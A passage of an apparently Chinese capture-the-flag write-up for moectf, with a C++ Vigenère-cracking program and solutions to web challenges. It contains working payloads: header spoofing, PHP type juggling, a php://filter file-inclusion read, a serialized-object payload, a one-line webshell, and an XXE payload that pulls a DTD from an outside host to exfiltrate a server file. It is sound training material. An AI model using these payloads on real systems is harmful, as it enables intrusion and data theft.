href="#06-大帝的征程-维吉尼亚Ex" class="headerlink" title="06 大帝的征程#维吉尼亚Ex"></a>06 大帝的征程#维吉尼亚Ex</h2><p>自动<strong>爆破</strong>   <del>脚本是嫖来的</del>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">重合指数差,与我们的标准重合指数的差值越小越好</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">float</span> value; </span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">存放key可能的长度和重合指数差</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">vector</span>&lt; Node &gt; key; </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">存放key可能的长度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">set</span>&lt; <span class="keyword">int</span> &gt; key_len; </span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">英文字母使用频率表</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">double</span> g[]=&#123;<span class="number">0.08167</span>, <span class="number">0.01492</span>, <span class="number">0.02782</span>, <span class="number">0.04253</span>, <span class="number">0.12702</span>, <span class="number">0.02228</span>, <span class="number">0.02015</span>, <span class="number">0.06094</span>, <span class="number">0.06966</span>, <span class="number">0.00153</span>, <span class="number">0.00772</span>, <span class="number">0.04025</span>,<span class="number">0.02406</span>, <span class="number">0.06749</span>, <span class="number">0.07507</span>, <span class="number">0.01929</span>, <span class="number">0.00095</span>, <span class="number">0.05987</span>, <span class="number">0.06327</span>, <span class="number">0.09056</span>, <span class="number">0.02758</span>, <span class="number">0.00978</span>, <span class="number">0.02360</span>, <span class="number">0.00150</span>,<span class="number">0.01974</span>, <span class="number">0.00074</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Greater_sort</span><span class="params">(Node a,Node b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a.value &lt; b.value;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Coincidence_index,计算所选分组的重合指数</span></span><br><span class="line"><span class="comment">start表示分组的起点,length表示步长</span></span><br><span class="line"><span class="comment">重合指数CI的实际估计值是X(i)=F(i)*(F(i)-1)/sum*(sum-1)</span></span><br><span class="line"><span class="comment">(&#x27;a&#x27;&lt;=i&lt;=&#x27;z&#x27;,F(i)为i字符在当前分组出现的次数)</span></span><br><span class="line"><span class="comment">对上述X(i)求和就是整个分组的重合指数CI</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">float</span> <span class="title">Coincidence_index</span><span class="params">(<span class="built_in">string</span> cipher, <span class="keyword">int</span> start, <span class="keyword">int</span> length)</span></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> index = <span class="number">0.000</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> num[<span class="number">26</span>];</span><br><span class="line">    <span class="built_in">memset</span>(num, <span class="number">0</span>, <span class="keyword">sizeof</span>(num));</span><br><span class="line">    <span class="keyword">while</span>(start &lt;= cipher.length())&#123;</span><br><span class="line">        num[cipher[start] - <span class="string">&#x27;a&#x27;</span>] ++;</span><br><span class="line">        start += length;</span><br><span class="line">        sum ++;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">26</span>; i ++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(num[i] &lt;= <span class="number">1</span>) <span class="keyword">continue</span>;</span><br><span class="line">        index += (<span class="keyword">float</span>)(num[i] * (num[i] - <span class="number">1</span>)) / (<span class="keyword">float</span>)((sum) * (sum - <span class="number">1</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> index;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Find_same()函数即是根据 kasiski测试法的原理</span></span><br><span class="line"><span class="comment">可以获取key可能的长度</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Find_same</span><span class="params">(<span class="built_in">string</span> cipher)</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">3</span>; i &lt; <span class="number">5</span>; i ++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; cipher.length() - i; j ++)&#123;</span><br><span class="line">            <span class="built_in">string</span> p = cipher.substr(j, i);</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = j + i; k &lt; cipher.length() - i; k ++)&#123;</span><br><span class="line">                <span class="built_in">string</span> tmp = cipher.substr(k, i);</span><br><span class="line">                <span class="keyword">if</span>(tmp == p)&#123;</span><br><span class="line">                    Node x;</span><br><span class="line">                    x.length = k - j;</span><br><span class="line">                    key.push_back(x);</span><br><span class="line">            &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b == <span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gcd(b, a % b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">求出可能的key的值的最大公因子</span></span><br><span class="line"><span class="comment">经过重合指数检验,对key的长度进行排序</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Get_key</span><span class="params">(<span class="built_in">string</span> cipher)</span></span>&#123;</span><br><span class="line">    Find_same(cipher);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; key.size(); i ++)&#123;</span><br><span class="line">        <span class="keyword">int</span> x = key[i].length;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; key.size(); j ++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(key[i].length &gt; key[j].length)</span><br><span class="line">                key_len.insert(gcd(key[i].length,key[j].length));</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                key_len.insert(gcd(key[j].length,key[i].length));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    key.clear();</span><br><span class="line">    <span class="built_in">set</span>&lt; <span class="keyword">int</span> &gt;::iterator it = key_len.begin();</span><br><span class="line">    <span class="keyword">while</span>(it != key_len.end())&#123;</span><br><span class="line">        <span class="keyword">int</span> length = *it;</span><br><span class="line">        <span class="keyword">if</span>(length == <span class="number">1</span>)&#123;</span><br><span class="line">            it ++;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">float</span> sum = <span class="number">0.000</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt; length&lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; length; i ++)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt; Coincidence_index(cipher, i, length)&lt;&lt; <span class="string">&quot;  &quot;</span>;</span><br><span class="line">            sum += Coincidence_index(cipher, i, length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        Node x;</span><br><span class="line">        x.length = length;</span><br><span class="line">        x.value = (<span class="keyword">float</span>)fabsf(<span class="number">0.065</span> - (<span class="keyword">float</span>)(sum / (<span class="keyword">float</span>)length));</span><br><span class="line">        <span class="keyword">if</span>(x.value &lt;= <span class="number">0.1</span>)</span><br><span class="line">            key.push_back(x);</span><br><span class="line">        it ++;</span><br><span class="line">    &#125;</span><br><span class="line">    sort(key.begin(), key.end(), Greater_sort);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">为了提高解密的成功率,取前面10个公因子进行求解</span></span><br><span class="line"><span class="comment">对每个公因子的每个分子进行字母的拟重合指数分析</span></span><br><span class="line"><span class="comment">由Chi测试(卡方检验),获取峰值点</span></span><br><span class="line"><span class="comment">该峰值点极有可能是明文</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Get_ans</span><span class="params">(<span class="built_in">string</span> cipher)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lss = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(lss &lt; key.size() &amp;&amp; lss &lt; <span class="number">10</span>)&#123;</span><br><span class="line">        Node x = key[lss];</span><br><span class="line">        <span class="keyword">int</span> ans[cipher.length()];</span><br><span class="line">        <span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="keyword">sizeof</span>(ans));</span><br><span class="line">        <span class="built_in">map</span>&lt; <span class="keyword">char</span>, <span class="keyword">int</span> &gt; mp;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; x.length; i ++)&#123;</span><br><span class="line">            <span class="keyword">double</span> max_pg = <span class="number">0.000</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> k = <span class="number">0</span>; k &lt; <span class="number">26</span>; k ++)&#123;</span><br><span class="line">                mp.clear();</span><br><span class="line">                <span class="keyword">double</span> pg = <span class="number">0.000</span>;</span><br><span class="line">                <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">int</span> j = i; j &lt; cipher.length(); j += x.length)&#123;</span><br><span class="line">                    <span class="keyword">char</span> c=(<span class="keyword">char</span>)((cipher[j] - <span class="string">&#x27;a&#x27;</span> + k) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">                    mp[c] ++;</span><br><span class="line">                    sum ++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">for</span>(<span class="keyword">char</span> j = <span class="string">&#x27;a&#x27;</span>; j &lt;= <span class="string">&#x27;z&#x27;</span>; j ++)</span><br><span class="line">                    pg += ((<span class="keyword">double</span>)mp[j] / (<span class="keyword">double</span>)sum) * g[j - <span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">                <span class="keyword">if</span>(pg &gt; max_pg)&#123;</span><br><span class="line">                    ans[i] = k;</span><br><span class="line">                    max_pg = pg;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt; <span class="built_in">endl</span>&lt;&lt; <span class="built_in">endl</span>&lt;&lt; <span class="string">&quot;[!]Key length: &quot;</span>&lt;&lt; <span class="built_in">endl</span>&lt;&lt; x.length&lt;&lt; <span class="built_in">endl</span>&lt;&lt; <span class="string">&quot;[!]Probable key: &quot;</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; x.length; i ++)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt; (<span class="keyword">char</span>)((<span class="number">26</span> - ans[i]) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>)&lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt; <span class="built_in">endl</span>&lt;&lt; <span class="string">&quot;[!]Clear text:&quot;</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; cipher.length(); i ++)</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt; (<span class="keyword">char</span>)((cipher[i] - <span class="string">&#x27;a&#x27;</span> + ans[i % x.length]) % <span class="number">26</span> + <span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt; <span class="built_in">endl</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">        lss ++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">string</span> cipher;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; <span class="string">&quot;[?]Please input the encrypted words:&quot;</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt; cipher;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; <span class="string">&quot;[+]Transforming into lower case.&quot;</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    transform(cipher.begin(), cipher.end(), cipher.begin(), ::<span class="built_in">tolower</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; <span class="string">&quot;[+]Attempting to solve the encryption.&quot;</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    Get_key(cipher);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; key.size(); i ++)</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt; key[i].length&lt;&lt; <span class="string">&quot;  and &quot;</span>&lt;&lt; key[i].value&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    Get_ans(cipher);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt; <span class="string">&quot;[+]Done!&quot;</span>&lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="世界线2-2"><a href="#世界线2-2" class="headerlink" title="世界线2"></a>世界线2</h3><p>找到类似flag的东西。</p><p>ooukot{ig3_oqf1_Ymiedmms_BzVn3_s0w_w0_3csO}</p><p>大括号前明文是moectf，盲猜Ymiedmms是Virginia，w0是s0，3csO是3asY。</p><p>然后<strong>手撕</strong>。</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="01-GET"><a href="#01-GET" class="headerlink" title="01 GET"></a>01 GET</h2><p>get提交a=flag</p><hr><h2 id="02-POST"><a href="#02-POST" class="headerlink" title="02 POST"></a>02 POST</h2><p>POST提交a=flag</p><hr><h2 id="03-小饼干"><a href="#03-小饼干" class="headerlink" title="03 小饼干"></a>03 小饼干</h2><p>flag在cookie里</p><hr><h2 id="04-Introduction"><a href="#04-Introduction" class="headerlink" title="04 Introduction"></a>04 Introduction</h2><p>进俩页面，查看源码</p><p>查找moectf和}</p><hr><h2 id="05-一句话"><a href="#05-一句话" class="headerlink" title="05 一句话"></a>05 一句话</h2><p>一句话shell，菜刀连上，管理文件</p><hr><h2 id="06-EzMath"><a href="#06-EzMath" class="headerlink" title="06 EzMath"></a>06 EzMath</h2><p>在浏览器里禁用js脚本</p><hr><h2 id="07-三心二意"><a href="#07-三心二意" class="headerlink" title="07 三心二意"></a>07 三心二意</h2><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;39.97.238.171:8002&#x2F;?a&#x3D;0&amp;c&#x3D;QNKCDZO</span><br><span class="line"></span><br><span class="line">post:</span><br><span class="line">b&#x3D;1522455bbyyds</span><br><span class="line"></span><br><span class="line">cookie:</span><br><span class="line">d&#x3D;-1E100</span><br></pre></td></tr></table></figure><hr><h2 id="08-俄罗斯头套"><a href="#08-俄罗斯头套" class="headerlink" title="08 俄罗斯头套"></a>08 俄罗斯头套</h2><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: 39.98.86.109:10002</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">DNT: 1</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) supreme&#x2F;114.514.19.19.810 Safari&#x2F;537.36</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Referer: https:&#x2F;&#x2F;www.baidu.com</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh-TW;q&#x3D;0.9,zh;q&#x3D;0.8,ja;q&#x3D;0.7,en;q&#x3D;0.6</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 11</span><br><span class="line"></span><br><span class="line">luoqian&#x3D;god</span><br></pre></td></tr></table></figure><hr><h2 id="09-Moe-include"><a href="#09-Moe-include" class="headerlink" title="09 Moe include"></a>09 Moe include</h2><p>payload:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmVjaG8gIkNhbiB5b3UgZ2V0IHRoZSBmbGFnPyI7DQovL21vZWN0ZntwaHBfaXNfdGhlX2Jlc3RfbGFuZ3VhZ2V9DQo=</span><br></pre></td></tr></table></figure><p>base64转换，拿到flag</p><hr><h2 id="10-Moe-unserialize"><a href="#10-Moe-unserialize" class="headerlink" title="10 Moe unserialize"></a>10 Moe unserialize</h2><p> 根据提示，下载网页临时文件<code>.index.php.swp</code></p><p>在linux上用vim读取，获取源代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Moe</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $a = <span class="string">&#x27;1&#x27;</span>;</span><br><span class="line">        <span class="keyword">protected</span> $b = <span class="string">&#x27;2&#x27;</span>;</span><br><span class="line">        <span class="keyword">private</span> $c = <span class="string">&#x27;3&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">$test = <span class="keyword">new</span> Moe();</span><br><span class="line"><span class="keyword">echo</span> serialize($test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">O</span><span class="selector-pseudo">:3</span><span class="selector-pseudo">:&quot;Moe&quot;</span><span class="selector-pseudo">:3</span>:&#123;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">&quot;a&quot;</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">&quot;1&quot;</span>;<span class="attribute">s</span>:<span class="number">4</span>:<span class="string">&quot;%00*%00b&quot;</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">&quot;2&quot;</span>;<span class="attribute">s</span>:<span class="number">6</span>:<span class="string">&quot;%00Moe%00c&quot;</span>;<span class="attribute">s</span>:<span class="number">1</span>:<span class="string">&quot;3&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="11-EzXXE"><a href="#11-EzXXE" class="headerlink" title="11  EzXXE"></a>11  EzXXE</h2><h3 id="解题思路-17"><a href="#解题思路-17" class="headerlink" title="解题思路"></a>解题思路</h3><p>XXE任意文件读取</p><h3 id="解题过程-27"><a href="#解题过程-27" class="headerlink" title="解题过程"></a>解题过程</h3><ul><li><p>给出了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// flag is in &#x27;/flags/flag1.txt&#x27; and &#x27;/flags/flag2.php&#x27;</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="literal">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (strpos($xmlfile,<span class="string">&quot;flag1.txt&quot;</span>) !== <span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($xmlfile,<span class="string">&#x27;file:/&#x27;</span>) === <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Please use file protocol.&lt;br/&gt;&lt;br/&gt;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (strpos($xmlfile,<span class="string">&quot;flag2.php&quot;</span>) !== <span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span> (strpos($xmlfile,<span class="string">&#x27;file:/&#x27;</span>) !== <span class="literal">FALSE</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Why not try php://filter?&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">$test = simplexml_import_dom($dom);</span><br><span class="line"><span class="keyword">echo</span> $test;</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></li></ul><p>POST提交payload，获取flag2.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">    &lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;&#x2F;flags&#x2F;flag2.php&quot;&gt;</span><br><span class="line">    &lt;!ENTITY % dtd SYSTEM &quot;http:&#x2F;&#x2F;3l365568x0.qicp.vip&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">    %dtd;</span><br><span class="line">    %send;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;hhh&gt;%send&lt;&#x2F;hhh&gt;</span><br><span class="line">&lt;!-&#x2F;?file&#x3D;PD9waHAgJGZsYWcyID0gJzRuZF9waHBfZjFsdDNyfSc7ID8+ HTTP&#x2F;1.0-!&gt;</span><br><span class="line">&lt;!-&lt;?php $flag2 &#x3D; &#39;4nd_php_f1lt3r&#125;&#39;; ?&gt;-!&gt;</span><br></pre></td></tr></table></figure><p>POST提交payload，获取flag1.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml 